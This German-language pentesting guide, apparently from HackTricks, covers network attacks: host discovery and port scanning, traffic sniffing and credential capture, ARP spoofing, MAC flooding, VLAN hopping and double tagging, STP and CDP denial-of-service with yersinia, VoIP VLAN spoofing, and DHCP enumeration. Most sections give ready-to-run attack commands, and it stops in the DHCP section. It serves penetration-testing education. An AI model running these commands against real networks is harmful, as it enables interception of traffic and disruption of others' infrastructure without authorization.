# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Entdecken von Hosts von außen

Dies wird ein **kurzer Abschnitt** darüber sein, wie man **IPs, die antworten**, aus dem **Internet** findet.\
In dieser Situation haben Sie einige **IP-Bereiche** (vielleicht sogar mehrere **Bereiche**) und Sie müssen nur herausfinden, **welche IPs antworten**.

### ICMP

Dies ist der **einfachste** und **schnellste** Weg, um herauszufinden, ob ein Host aktiv ist oder nicht.\
Sie könnten versuchen, einige **ICMP**-Pakete zu senden und **Antworten zu erwarten**. Der einfachste Weg ist, einfach eine **Echo-Anfrage** zu senden und auf die Antwort zu warten. Sie können dies mit einem einfachen `ping` oder mit `fping` für **Bereiche** tun.\
Sie könnten auch **nmap** verwenden, um andere Arten von ICMP-Paketen zu senden (dies wird Filter für gängige ICMP-Echo-Anfrage-Antworten vermeiden).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Es ist sehr häufig, dass alle Arten von ICMP-Paketen gefiltert werden. Dann bleibt Ihnen nur, um zu überprüfen, ob ein Host aktiv ist, **offene Ports zu finden**. Jeder Host hat **65535 Ports**, also, wenn Sie einen "großen" Umfang haben, können Sie **nicht** testen, ob **jeder Port** jedes Hosts offen ist oder nicht, das würde zu viel Zeit in Anspruch nehmen.\
Was Sie brauchen, ist ein **schneller Port-Scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) und eine Liste der **am häufigsten verwendeten Ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Sie könnten diesen Schritt auch mit `nmap` durchführen, aber es ist langsamer und `nmap` hat Probleme, Hosts zu identifizieren, die aktiv sind.

### HTTP Port Discovery

Dies ist nur eine TCP-Portentdeckung, die nützlich ist, wenn Sie **sich auf die Entdeckung von HTTP** **Diensten** konzentrieren möchten:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP-Port-Entdeckung

Sie könnten auch versuchen, einige **UDP-Ports zu überprüfen**, um zu entscheiden, ob Sie **mehr Aufmerksamkeit** auf einen **Host** richten sollten. Da UDP-Dienste normalerweise **nicht mit** **irgendwelchen Daten** auf ein reguläres leeres UDP-Probe-Paket **reagieren**, ist es schwierig zu sagen, ob ein Port gefiltert oder offen ist. Der einfachste Weg, dies zu entscheiden, besteht darin, ein Paket zu senden, das mit dem laufenden Dienst verbunden ist, und da Sie nicht wissen, welcher Dienst läuft, sollten Sie den wahrscheinlichsten basierend auf der Portnummer versuchen:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die zuvor vorgeschlagene nmap-Zeile testet die **top 1000 UDP-Ports** in jedem Host innerhalb des **/24**-Bereichs, aber selbst dies wird **>20min** dauern. Wenn Sie **schnellere Ergebnisse** benötigen, können Sie [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) verwenden: `./udp-proto-scanner.pl 199.66.11.53/24`. Dies wird diese **UDP-Proben** an ihren **erwarteten Port** senden (für einen /24-Bereich dauert dies nur 1 Minute): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier finden Sie einen schönen Leitfaden zu allen bekannten Wifi-Angriffen zum Zeitpunkt des Schreibens:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Entdecken von Hosts von innen

Wenn Sie sich im Netzwerk befinden, ist eines der ersten Dinge, die Sie tun möchten, **andere Hosts zu entdecken**. Je nachdem, **wie viel Lärm** Sie machen können/wollen, können verschiedene Aktionen durchgeführt werden:

### Passiv

Sie können diese Tools verwenden, um Hosts in einem verbundenen Netzwerk passiv zu entdecken:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktiv

Beachten Sie, dass die in [_**Entdecken von Hosts von außen**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) kommentierten Techniken auch **hier angewendet** werden können.\
Aber da Sie im **gleichen Netzwerk** wie die anderen Hosts sind, können Sie **mehr Dinge** tun:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Beachten Sie, dass die in _Hosts von außen entdecken_ kommentierten Techniken ([_**ICMP**_](./#icmp)) auch hier **angewendet werden können**.\
Aber da Sie im **gleichen Netzwerk** wie die anderen Hosts sind, können Sie **mehr Dinge** tun:

- Wenn Sie eine **Subnetz-Broadcast-Adresse** **pingen**, sollte das Ping zu **jedem Host** ankommen und sie könnten **antworten**: `ping -b 10.10.5.255`
- Durch das Pingen der **Netzwerk-Broadcast-Adresse** könnten Sie sogar Hosts in **anderen Subnetzen** finden: `ping -b 255.255.255.255`
- Verwenden Sie die `-PE`, `-PP`, `-PM` Flags von `nmap`, um die Hostentdeckung durch das Senden von **ICMPv4 Echo**, **Zeitstempel** und **Subnetzmaskenanforderungen** durchzuführen: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan wird verwendet, um Computer über eine **Netzwerknachricht** **einzuschalten**. Das magische Paket, das verwendet wird, um den Computer einzuschalten, ist nur ein Paket, in dem eine **MAC Dst** bereitgestellt wird und dann **16 Mal** innerhalb desselben Pakets **wiederholt** wird.\
Solche Pakete werden normalerweise in einem **Ethernet 0x0842** oder in einem **UDP-Paket an Port 9** gesendet.\
Wenn **keine \[MAC]** bereitgestellt wird, wird das Paket an **Broadcast-Ethernet** gesendet (und die Broadcast-MAC wird die sein, die wiederholt wird).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scannen von Hosts

Sobald Sie alle IPs (extern oder intern) entdeckt haben, die Sie eingehend scannen möchten, können verschiedene Aktionen durchgeführt werden.

### TCP

- **Offener** Port: _SYN --> SYN/ACK --> RST_
- **Geschlossener** Port: _SYN --> RST/ACK_
- **Gefilterter** Port: _SYN --> \[KEINE ANTWORT]_
- **Gefilterter** Port: _SYN --> ICMP-Nachricht_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Es gibt 2 Optionen, um einen UDP-Port zu scannen:

- Sende ein **UDP-Paket** und überprüfe die Antwort _**ICMP unreachable**_, wenn der Port **geschlossen** ist (in mehreren Fällen wird ICMP **gefiltert**, sodass du keine Informationen erhältst, ob der Port geschlossen oder offen ist).
- Sende **formatierte Datagramme**, um eine Antwort von einem **Dienst** (z. B. DNS, DHCP, TFTP und andere, wie in _nmap-payloads_ aufgeführt) zu erhalten. Wenn du eine **Antwort** erhältst, ist der Port **offen**.

**Nmap** wird **beide** Optionen mit "-sV" kombinieren (UDP-Scans sind sehr langsam), aber beachte, dass UDP-Scans langsamer sind als TCP-Scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** wurde entwickelt, um zusammen mit **TCP (Transmission Control Protocol)** und **UDP (User Datagram Protocol)** verwendet zu werden. Sein Hauptzweck besteht darin, den Transport von Telefondaten über IP-Netzwerke zu erleichtern, wobei viele der Zuverlässigkeitsmerkmale, die im **Signaling System 7 (SS7)** zu finden sind, nachgebildet werden. **SCTP** ist ein Kernbestandteil der **SIGTRAN**-Protokollfamilie, die darauf abzielt, SS7-Signale über IP-Netzwerke zu transportieren.

Die Unterstützung für **SCTP** wird von verschiedenen Betriebssystemen bereitgestellt, wie **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** und **VxWorks**, was auf seine breite Akzeptanz und Nützlichkeit im Bereich der Telekommunikation und Netzwerktechnologie hinweist.

Zwei verschiedene Scans für SCTP werden von nmap angeboten: _-sY_ und _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS- und IPS-Umgehung

{{#ref}}
ids-evasion.md
{{#endref}}

### **Weitere nmap-Optionen**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Offenlegung interner IP-Adressen

**Fehlkonfigurierte Router, Firewalls und Netzwerkgeräte** reagieren manchmal auf Netzwerkabfragen mit **nicht öffentlichen Quelladressen**. **tcpdump** kann verwendet werden, um Pakete zu identifizieren, die während des Tests von privaten Adressen empfangen werden. Insbesondere können auf Kali Linux Pakete über die **eth2-Schnittstelle** erfasst werden, die vom öffentlichen Internet aus zugänglich ist. Es ist wichtig zu beachten, dass solche Pakete wahrscheinlich herausgefiltert werden, wenn Ihre Einrichtung hinter einem NAT oder einer Firewall steht.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Durch Sniffing können Sie Details zu IP-Bereichen, Subnetzgrößen, MAC-Adressen und Hostnamen erfahren, indem Sie erfasste Frames und Pakete überprüfen. Wenn das Netzwerk falsch konfiguriert ist oder die Switching-Infrastruktur unter Stress steht, können Angreifer sensible Materialien durch passives Network Sniffing erfassen.

Wenn ein switched Ethernet-Netzwerk richtig konfiguriert ist, sehen Sie nur Broadcast-Frames und Materialien, die für Ihre MAC-Adresse bestimmt sind.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Man kann auch Pakete von einer entfernten Maschine über eine SSH-Sitzung mit Wireshark als GUI in Echtzeit erfassen.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Offensichtlich.

### Erfassung von Anmeldeinformationen

Sie können Tools wie [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) verwenden, um Anmeldeinformationen aus einer pcap oder einer Live-Schnittstelle zu parsen.

## LAN-Angriffe

### ARP-Spoofing

ARP-Spoofing besteht darin, kostenlose ARP-Antworten zu senden, um anzuzeigen, dass die IP eines Geräts die MAC unseres Geräts hat. Dann wird das Opfer die ARP-Tabelle ändern und wird unser Gerät kontaktieren, wann immer es die gefälschte IP kontaktieren möchte.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM-Überlauf

Überfluten Sie die CAM-Tabelle des Switches, indem Sie viele Pakete mit unterschiedlichen Quell-MAC-Adressen senden. Wenn die CAM-Tabelle voll ist, verhält sich der Switch wie ein Hub (broadcastet den gesamten Verkehr).
```bash
macof -i <interface>
```
In modernen Switches wurde diese Schwachstelle behoben.

### 802.1Q VLAN / DTP Angriffe

#### Dynamisches Trunking

Das **Dynamic Trunking Protocol (DTP)** ist als Linkschichtprotokoll konzipiert, um ein automatisches System für das Trunking zu ermöglichen, das es Switches erlaubt, automatisch Ports für den Trunk-Modus (Trunk) oder den Nicht-Trunk-Modus auszuwählen. Der Einsatz von **DTP** wird oft als Indikator für suboptimales Netzwerkdesign angesehen, was die Bedeutung der manuellen Konfiguration von Trunks nur dort unterstreicht, wo es notwendig ist, und die ordnungsgemäße Dokumentation sicherzustellen.

Standardmäßig sind Switch-Ports so eingestellt, dass sie im Dynamic Auto-Modus arbeiten, was bedeutet, dass sie bereit sind, das Trunking zu initiieren, wenn sie von einem benachbarten Switch dazu aufgefordert werden. Ein Sicherheitsproblem entsteht, wenn ein Pentester oder Angreifer sich mit dem Switch verbindet und ein DTP Desirable-Frame sendet, wodurch der Port in den Trunk-Modus versetzt wird. Diese Aktion ermöglicht es dem Angreifer, VLANs durch die Analyse von STP-Frames zu enumerieren und die VLAN-Segmentierung zu umgehen, indem virtuelle Schnittstellen eingerichtet werden.

Die standardmäßige Präsenz von DTP in vielen Switches kann von Gegnern ausgenutzt werden, um das Verhalten eines Switches nachzuahmen und so Zugriff auf den Datenverkehr über alle VLANs zu erhalten. Das Skript [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) wird verwendet, um eine Schnittstelle zu überwachen und zu zeigen, ob ein Switch im Default-, Trunk-, Dynamic-, Auto- oder Access-Modus ist—letzteres ist die einzige Konfiguration, die gegen VLAN-Hopping-Angriffe immun ist. Dieses Tool bewertet den Vulnerabilitätsstatus des Switches.

Sollte eine Netzwerkschwachstelle identifiziert werden, kann das _**Yersinia**_-Tool eingesetzt werden, um "Trunking zu aktivieren" über das DTP-Protokoll, was die Beobachtung von Paketen aus allen VLANs ermöglicht.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Um die VLANs aufzulisten, ist es auch möglich, das DTP Desirable-Frame mit dem Skript [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** zu generieren. **Unterbrechen Sie das Skript unter keinen Umständen. Es injiziert alle drei Sekunden DTP Desirable. **Die dynamisch erstellten Trunk-Kanäle am Switch leben nur fünf Minuten. Nach fünf Minuten fällt der Trunk ab.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ich möchte darauf hinweisen, dass **Access/Desirable (0x03)** anzeigt, dass der DTP-Rahmen vom Typ Desirable ist, was dem Port sagt, in den Trunk-Modus zu wechseln. Und **802.1Q/802.1Q (0xa5)** zeigt den **802.1Q** Kapselungstyp an.

Durch die Analyse der STP-Rahmen **erfahren wir von der Existenz von VLAN 30 und VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Angreifen spezifischer VLANs

Sobald Sie VLAN-IDs und IP-Werte kennen, können Sie **eine virtuelle Schnittstelle konfigurieren, um ein bestimmtes VLAN anzugreifen**.\
Wenn DHCP nicht verfügbar ist, verwenden Sie _ifconfig_, um eine statische IP-Adresse festzulegen.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatischer VLAN Hopper

Der besprochene Angriff von **Dynamic Trunking und dem Erstellen virtueller Schnittstellen sowie dem Entdecken von Hosts innerhalb** anderer VLANs wird **automatisch durchgeführt** von dem Tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doppelte Tagging

Wenn ein Angreifer den Wert der **MAC, IP und VLAN-ID des Opferhosts** kennt, könnte er versuchen, ein **Frame doppelt zu taggen** mit dem vorgesehenen VLAN und dem VLAN des Opfers und ein Paket zu senden. Da das **Opfer nicht in der Lage sein wird, mit dem Angreifer zurück zu verbinden**, ist die **beste Option für den Angreifer, über UDP zu kommunizieren** mit Protokollen, die einige interessante Aktionen durchführen können (wie SNMP).

Eine weitere Option für den Angreifer ist, einen **TCP-Portscan durchzuführen, indem er eine IP fälscht, die vom Angreifer kontrolliert wird und für das Opfer zugänglich ist** (wahrscheinlich über das Internet). Dann könnte der Angreifer im zweiten von ihm besessenen Host sniffen, ob er einige Pakete vom Opfer erhält.

![](<../../images/image (190).png>)

Um diesen Angriff durchzuführen, könnten Sie scapy verwenden: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Wenn Sie **Zugriff auf einen Switch haben, mit dem Sie direkt verbunden sind**, haben Sie die Möglichkeit, **VLAN-Segmentierung** im Netzwerk zu **umgehen**. Schalten Sie einfach den Port in den Trunk-Modus (auch bekannt als Trunk), erstellen Sie virtuelle Schnittstellen mit den IDs der Ziel-VLANs und konfigurieren Sie eine IP-Adresse. Sie können versuchen, die Adresse dynamisch anzufordern (DHCP) oder sie statisch zu konfigurieren. Es hängt vom Fall ab.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In bestimmten Umgebungen, wie z.B. Gast-WLAN-Netzwerken, werden **Port-Isolations- (auch bekannt als private VLAN)**-Einstellungen implementiert, um zu verhindern, dass Clients, die mit einem drahtlosen Zugangspunkt verbunden sind, direkt miteinander kommunizieren. Es wurde jedoch eine Technik identifiziert, die diese Isolationsmaßnahmen umgehen kann. Diese Technik nutzt entweder das Fehlen von Netzwerk-ACLs oder deren unsachgemäße Konfiguration aus, wodurch IP-Pakete über einen Router geleitet werden können, um einen anderen Client im selben Netzwerk zu erreichen.

Der Angriff wird ausgeführt, indem ein **Paket erstellt wird, das die IP-Adresse des Ziel-Clients, jedoch mit der MAC-Adresse des Routers** trägt. Dies führt dazu, dass der Router das Paket fälschlicherweise an den Ziel-Client weiterleitet. Dieser Ansatz ähnelt dem, der bei Double Tagging Attacks verwendet wird, bei dem die Fähigkeit, einen für das Opfer zugänglichen Host zu kontrollieren, genutzt wird, um die Sicherheitsanfälligkeit auszunutzen.

**Wichtige Schritte des Angriffs:**

1. **Erstellen eines Pakets:** Ein Paket wird speziell erstellt, um die IP-Adresse des Ziel-Clients, jedoch mit der MAC-Adresse des Routers, zu enthalten.
2. **Ausnutzen des Routerverhaltens:** Das erstellte Paket wird an den Router gesendet, der aufgrund der Konfiguration das Paket an den Ziel-Client umleitet und dabei die Isolation, die durch die privaten VLAN-Einstellungen bereitgestellt wird, umgeht.

### VTP Angriffe

VTP (VLAN Trunking Protocol) zentralisiert das VLAN-Management. Es nutzt Versionsnummern, um die Integrität der VLAN-Datenbank aufrechtzuerhalten; jede Änderung erhöht diese Nummer. Switches übernehmen Konfigurationen mit höheren Versionsnummern und aktualisieren ihre eigenen VLAN-Datenbanken.

#### VTP-Domain-Rollen

- **VTP-Server:** Verwaltet VLANs—erstellt, löscht, ändert. Er sendet VTP-Ankündigungen an die Mitglieder der Domain.
- **VTP-Client:** Empfängt VTP-Ankündigungen, um seine VLAN-Datenbank zu synchronisieren. Diese Rolle ist von lokalen VLAN-Konfigurationsänderungen ausgeschlossen.
- **VTP-Transparent:** Nimmt nicht an VTP-Updates teil, leitet jedoch VTP-Ankündigungen weiter. Unberührt von VTP-Angriffen, behält es eine konstante Versionsnummer von null bei.

#### VTP-Ankündigungstypen

- **Zusammenfassungsankündigung:** Wird alle 300 Sekunden vom VTP-Server gesendet und enthält wesentliche Domaininformationen.
- **Teilmenge-Ankündigung:** Wird nach Änderungen an der VLAN-Konfiguration gesendet.
- **Ankündigungsanfrage:** Wird von einem VTP-Client ausgegeben, um eine Zusammenfassungsankündigung anzufordern, typischerweise als Reaktion auf die Erkennung einer höheren Konfigurationsversionsnummer.

VTP-Sicherheitsanfälligkeiten sind ausschließlich über Trunk-Ports ausnutzbar, da VTP-Ankündigungen nur durch diese zirkulieren. Nach DTP-Angriffsszenarien könnte der Fokus auf VTP verschwenken. Tools wie Yersinia können VTP-Angriffe erleichtern, die darauf abzielen, die VLAN-Datenbank zu löschen und das Netzwerk effektiv zu stören.

Hinweis: Diese Diskussion bezieht sich auf VTP-Version 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Im grafischen Modus von Yersinia wählen Sie die Option zum Löschen aller VTP-VLANs, um die VLAN-Datenbank zu bereinigen.

### STP-Angriffe

**Wenn Sie keine BPDU-Frames an Ihren Schnittstellen erfassen können, ist es unwahrscheinlich, dass Sie in einem STP-Angriff erfolgreich sind.**

#### **STP BPDU DoS**

Durch das Senden einer großen Anzahl von BPDUs TCP (Topology Change Notification) oder Conf (die BPDUs, die gesendet werden, wenn die Topologie erstellt wird) werden die Switches überlastet und funktionieren nicht mehr richtig.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP-Angriff**

Wenn ein TCP gesendet wird, wird die CAM-Tabelle der Switches in 15 Sekunden gelöscht. Wenn Sie dann kontinuierlich diese Art von Paketen senden, wird die CAM-Tabelle kontinuierlich (oder alle 15 Sekunden) neu gestartet, und wenn sie neu gestartet wird, verhält sich der Switch wie ein Hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Angriff**

Der Angreifer simuliert das Verhalten eines Switches, um der STP-Root des Netzwerks zu werden. Dann werden mehr Daten durch ihn geleitet. Dies ist interessant, wenn Sie mit zwei verschiedenen Switches verbunden sind.\
Dies geschieht durch das Senden von BPDUs CONF-Paketen, die besagen, dass der **Prioritäts**wert geringer ist als die tatsächliche Priorität des aktuellen Root-Switches.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Wenn der Angreifer mit 2 Switches verbunden ist, kann er der Wurzel des neuen Baumes sein und der gesamte Verkehr zwischen diesen Switches wird über ihn geleitet** (ein MITM-Angriff wird durchgeführt).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP-Angriffe

CISCO Discovery Protocol (CDP) ist entscheidend für die Kommunikation zwischen CISCO-Geräten, da es ihnen ermöglicht, **einander zu identifizieren und Konfigurationsdetails auszutauschen**.

#### Passive Datensammlung <a href="#id-0e0f" id="id-0e0f"></a>

CDP ist so konfiguriert, dass es Informationen über alle Ports sendet, was zu einem Sicherheitsrisiko führen kann. Ein Angreifer könnte, nachdem er sich mit einem Switch-Port verbunden hat, Netzwerksniffer wie **Wireshark**, **tcpdump** oder **Yersinia** einsetzen. Diese Aktion kann sensible Daten über das Netzwerkgerät offenbaren, einschließlich seines Modells und der Version von Cisco IOS, die es verwendet. Der Angreifer könnte dann gezielt spezifische Schwachstellen in der identifizierten Cisco IOS-Version angreifen.

#### Induzierung von CDP-Tabellenflut <a href="#id-0d6a" id="id-0d6a"></a>

Ein aggressiverer Ansatz besteht darin, einen Denial of Service (DoS)-Angriff zu starten, indem der Speicher des Switches überlastet wird, während man sich als legitime CISCO-Geräte ausgibt. Unten steht die Befehlssequenz zum Initiieren eines solchen Angriffs mit Yersinia, einem Netzwerktool, das für Tests entwickelt wurde:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Während dieses Angriffs sind die CPU des Switches und die CDP-Nachbartabelle stark belastet, was oft als **„Netzwerkparalyse“** aufgrund des übermäßigen Ressourcenverbrauchs bezeichnet wird.

#### CDP-Imitationsangriff
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Sie könnten auch [**scapy**](https://github.com/secdev/scapy/) verwenden. Stellen Sie sicher, dass Sie es mit dem `scapy/contrib`-Paket installieren.

### VoIP-Angriffe und das VoIP Hopper-Tool

VoIP-Telefone, die zunehmend mit IoT-Geräten integriert sind, bieten Funktionen wie das Öffnen von Türen oder die Steuerung von Thermostaten über spezielle Telefonnummern. Diese Integration kann jedoch Sicherheitsrisiken mit sich bringen.

Das Tool [**voiphopper**](http://voiphopper.sourceforge.net) ist dafür konzipiert, ein VoIP-Telefon in verschiedenen Umgebungen (Cisco, Avaya, Nortel, Alcatel-Lucent) zu emulieren. Es entdeckt die VLAN-ID des Sprachnetzwerks mithilfe von Protokollen wie CDP, DHCP, LLDP-MED und 802.1Q ARP.

**VoIP Hopper** bietet drei Modi für das Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analysiert Netzwerkpakete, um die VLAN-ID zu identifizieren.
2. **Spoof Mode** (`-c 1`): Generiert benutzerdefinierte Pakete, die denen eines tatsächlichen VoIP-Geräts ähneln.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Sendet Pakete, die identisch mit denen eines bestimmten Cisco-IP-Telefonmodells sind.

Der bevorzugte Modus für Geschwindigkeit ist der dritte. Es erfordert die Angabe von:

- Der Netzwerk-Schnittstelle des Angreifers (`-i`-Parameter).
- Dem Namen des emulierten VoIP-Geräts (`-E`-Parameter), der dem Cisco-Namensformat entspricht (z. B. SEP gefolgt von einer MAC-Adresse).

In Unternehmensumgebungen könnte man, um ein bestehendes VoIP-Gerät zu imitieren:

- Das MAC-Etikett am Telefon überprüfen.
- Die Anzeigeeinstellungen des Telefons durchsuchen, um Modellinformationen anzuzeigen.
- Das VoIP-Gerät mit einem Laptop verbinden und CDP-Anfragen mit Wireshark beobachten.

Ein Beispielbefehl zur Ausführung des Tools im dritten Modus wäre:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP-Angriffe

#### Aufzählung
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
